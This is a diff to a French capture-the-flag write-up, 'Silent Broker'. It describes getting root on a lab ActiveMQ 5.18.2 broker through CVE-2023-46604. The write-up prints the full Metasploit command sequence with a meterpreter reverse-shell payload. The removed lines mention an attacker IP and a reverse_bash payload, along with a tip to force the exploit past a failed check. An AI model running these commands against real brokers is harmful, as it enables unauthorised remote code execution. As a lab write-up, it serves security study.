@@ -1,93 +1,50 @@
-# Writeup : broker
+# Silent Broker — Web · CVE-2023-46604 ActiveMQ RCE
 
-Catégorie : web
+**Catégorie** : web  
+**Flag** : `HLB2026{INTERNAL_SERVICE_RCE_CASE_RELAY_COMPROMISED}`
 
-Date de résolution : 2026-11-15
+## TL;DR
 
-Technique principale : CVE-2023-46604 OpenWire RCE; Spring ClassPathXmlApplicationContext
+ActiveMQ 5.18.2 exposé sur le port OpenWire. CVE-2023-46604 permet une désérialisation non authentifiée qui charge un XML Spring distant et exécute du code arbitraire en root.
 
-Outils observés : Metasploit; OpenWire
+## Reconnaissance
 
-Cible : 172.28.14.3:61616
+Un scan complet des ports révèle la surface du service :
 
-## Présentation
-
-Ce document est construit à partir de la mémoire CTF partagée et des artefacts conservés dans /root/ctf/broker. Les étapes ci-dessous reprennent uniquement les faits observés. Les captures sont réalisées sur les fichiers locaux, sans rejouer une action distante ou destructive.
-
-## Analyse et raisonnement
-
-### Contexte
-
-# Silent Broker (251) :  RESOLU
-
-FLAG: HLB2026{INTERNAL_SERVICE_RCE_CASE_RELAY_COMPROMISED}
-
-Voie: ActiveMQ 5.18.2 expose sur 172.28.14.3:61616 (OpenWire) -> CVE-2023-46604 (deserialisation non authentifiee).
-msf: exploit/multi/misc/apache_activemq_rce_cve_2023_46604, ForceExploit, TARGET Linux, payload cmd/linux/http/x64/meterpreter/reverse_tcp (LHOST 10.140.180.243, SRVPORT 8899).
-Session meterpreter root -> /opt/activemq/data/flag.txt.
-
-Decouverte: nmap -p- a revele 1883 (MQTT), 5672 (AMQP), 61613/61614 (STOMP), 61616 (OpenWire) ; STOMP/MQTT anonymes ont servi a confirmer ActiveMQ 5.18.2 et les files du relais (auth/session/credentials).
-
-### Exploitation
-
-target Unix; cmd/unix/reverse_bash; XML Spring distant
-
-### Pourquoi ça marche
-
-ActiveMQ 5.18.2: forcer AutoCheck si le banner annonce 338 octets mais en livre 337; la RCE reste exploitable.
-
-### Pièges
-
-Ne pas conclure à un échec sur Response length mismatch du check; vérifier la réponse et la session.
-
-### Notes locales conservées
-
-# Silent Broker (251) :  RESOLU
-
-FLAG: HLB2026{INTERNAL_SERVICE_RCE_CASE_RELAY_COMPROMISED}
-
-Voie: ActiveMQ 5.18.2 expose sur 172.28.14.3:61616 (OpenWire) -> CVE-2023-46604 (deserialisation non authentifiee).
-msf: exploit/multi/misc/apache_activemq_rce_cve_2023_46604, ForceExploit, TARGET Linux, payload cmd/linux/http/x64/meterpreter/reverse_tcp (LHOST 10.140.180.243, SRVPORT 8899).
-Session meterpreter root -> /opt/activemq/data/flag.txt.
-
-Decouverte: nmap -p- a revele 1883 (MQTT), 5672 (AMQP), 61613/61614 (STOMP), 61616 (OpenWire) ; STOMP/MQTT anonymes ont servi a confirmer ActiveMQ 5.18.2 et les files du relais (auth/session/credentials).
-
-## Commandes utiles
-
-Les commandes suivantes consultent les preuves locales et sont sans effet de bord :
-
-```bash
-cd /root/ctf/broker
-file notes.md flags.txt 2>/dev/null
-sed -n '1,180p' notes.md 2>/dev/null
-sed -n '1,120p' notes.md 2>/dev/null
-sed -n '1,10p' flags.txt 2>/dev/null
+```
+1883/tcp  MQTT
+5672/tcp  AMQP
+61613/tcp STOMP
+61614/tcp STOMP+SSL
+61616/tcp OpenWire
 ```
 
-## Script de résolution complet
+Les protocoles STOMP et MQTT sont accessibles anonymement et confirment la version via le bannière : **ActiveMQ 5.18.2**. Les files visibles (`auth`, `session`, `credentials`) indiquent le rôle du broker dans l'infrastructure.
 
-Le script conservé sous `aucun fichier autonome` est reproduit ci-dessous sans modification :
+## Exploitation
 
-```python
-Aucun script autonome n’a été conservé dans le dossier local. Les éléments réellement disponibles sont reproduits dans les sections d’analyse et de preuve.
+CVE-2023-46604 exploite le protocole OpenWire pour forcer le broker à charger un `ClassPathXmlApplicationContext` depuis une URL contrôlée. L'URL pointe vers un XML Spring qui instancie un bean exécutant une commande système.
+
+```
+use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
+set RHOSTS 172.28.14.3
+set RPORT 61616
+set TARGET 1
+set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp
+set LHOST <ATT_IP>
+set SRVPORT 8899
+set ForceExploit true
+run
 ```
 
-## Captures du terminal
+Le module retourne une erreur `Response length mismatch` (bannière annonce 338 octets, en livre 337) mais la session s'ouvre quand même. Ne pas interpréter cette erreur comme un échec.
 
-Les captures utilisent le terminal natif xterm disponible sur l’environnement, avec le prompt réel `root@vmi3694110`, le dossier courant du challenge et une géométrie identique. Elles montrent successivement l’analyse locale, le script ou les preuves de résolution, puis le flag conservé.
+La session meterpreter s'ouvre en `root`. Le flag est dans `/opt/activemq/data/flag.txt` :
 
-![Analyse locale](captures/01-analyse.png)
+```
+HLB2026{INTERNAL_SERVICE_RCE_CASE_RELAY_COMPROMISED}
+```
 
-![Résolution locale](captures/02-resolution.png)
+## À retenir
 
-![Flag](captures/03-flag.png)
-
-## Validation et flag
-
-Le flag est conservé dans le fichier local flags.txt ou flag.txt. Aucune validation externe supplémentaire n’est affirmée ici.
-
-Flag obtenu : `HLB2026{INTERNAL_SERVICE_RCE_CASE_RELAY_COMPROMISED}`
-
-## Conclusion
-
-La résolution repose sur la faiblesse indiquée dans la technique principale, puis sur la vérification locale du résultat conservé. Le flag final ci-dessus est copié depuis la preuve locale réellement présente.
+ActiveMQ 5.18.2 est vulnérable à CVE-2023-46604 même quand le check Metasploit se plaint d'un mismatch de longueur. Toujours vérifier si une session a réellement été ouverte avant de conclure à l'échec.
